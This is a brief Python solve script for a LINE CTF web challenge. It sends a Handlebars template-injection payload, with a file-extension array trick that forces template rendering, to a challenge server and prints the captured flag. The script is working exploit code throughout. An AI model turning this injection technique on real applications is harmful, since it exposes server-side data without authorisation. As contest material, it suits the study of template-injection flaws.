#!/usr/bin/env python3

import requests
import secrets

# curl http://35.221.86.202/
# Found. Redirecting to ca30570664932404ed7e96ad8f5e9eaf8f89c3d47a6dd50c200800a3f15ccd5b
URL = 'http://35.221.86.202/ca30570664932404ed7e96ad8f5e9eaf8f89c3d47a6dd50c200800a3f15ccd5b'

# fl4g is a variable, 727432 to base36 (line 15) is flag
r = requests.post(URL, json={
    "contents": '''
    {{#with this as |global|}}
    {{#with 727432 as |fl4g|}}
        {{lookup global (fl4g.toString 36)}}
    {{/with}}
    {{/with}}
    ''',
    "filename": secrets.token_hex(8),
    "ext": ['', '', '.ejs', ".hbs"]
})

target = "http://35.221.86.202"+r.json()['path']+",,.ejs,.hbs"

# http://35.221.86.202/ca30570664932404ed7e96ad8f5e9eaf8f89c3d47a6dd50c200800a3f15ccd5b/65e9458b31adba35,,.ejs,.hbs
r = requests.get(target)

print(r.text)
# LINECTF{I_think_emilia_is_reallllly_t3nshi}